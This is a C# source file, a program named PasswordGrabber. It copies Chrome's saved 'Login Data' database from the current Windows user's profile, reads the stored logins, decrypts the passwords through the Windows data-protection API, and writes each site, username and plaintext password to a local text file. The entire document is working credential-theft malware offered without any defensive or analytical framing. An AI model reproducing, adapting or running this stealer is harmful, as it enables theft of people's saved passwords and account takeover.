using System;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.IO;

namespace PasswordGrabber
{
    class Program
    {
        private StreamWriter writer = new StreamWriter("passwords.txt");


        public byte[] Unprotect(byte[] data, Program obj)
        {
            try
            {
                return ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser);
            }
            catch (CryptographicException ex)
            {
                obj.writer.WriteLine("###################################################");
                obj.writer.WriteLine("Data was not decrypted. An error occurred.");
                obj.writer.WriteLine(ex.ToString());
                obj.writer.WriteLine("###################################################");
                return null;
            }
        }

        static void Main(string[] args)
        {
            Program obj = new Program();
            
            obj.writer.WriteLine("origin_url\t\tusername_value\t\tpassword_value");
            obj.writer.WriteLine("---------------------------------------------------------------------------------------------------------------------------");
                        
            try
            {
                //Grab the local file and move/rename to exe directory
                string sourceFile = @"C:\Users\"+Environment.UserName+@"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
                System.IO.File.Copy(sourceFile, "Login_Data.db", true);

                //Create a SQLite connection from the obtained file
                SQLiteConnection con = new SQLiteConnection("Data Source = Login_Data.db");
                con.Open();
                SQLiteCommand cmd = con.CreateCommand();

                //Only grab username, password, and the associated url
                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                SQLiteDataReader reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    //Decrypt the password
                    byte[] password = obj.Unprotect((byte[])reader[2], obj);

                    string pwd = System.Text.Encoding.Default.GetString(password);
                    obj.writer.WriteLine(reader[0].ToString() + "\t" + reader[1].ToString() + "\t" + pwd);
                    obj.writer.WriteLine();
                }
            }
            catch (Exception ex)
            {
                obj.writer.WriteLine("###################################################");
                obj.writer.WriteLine("General exception ocurred");
                obj.writer.WriteLine(ex.ToString());
                obj.writer.WriteLine("###################################################");
            }
            obj.writer.Close();
        }        
    }
}
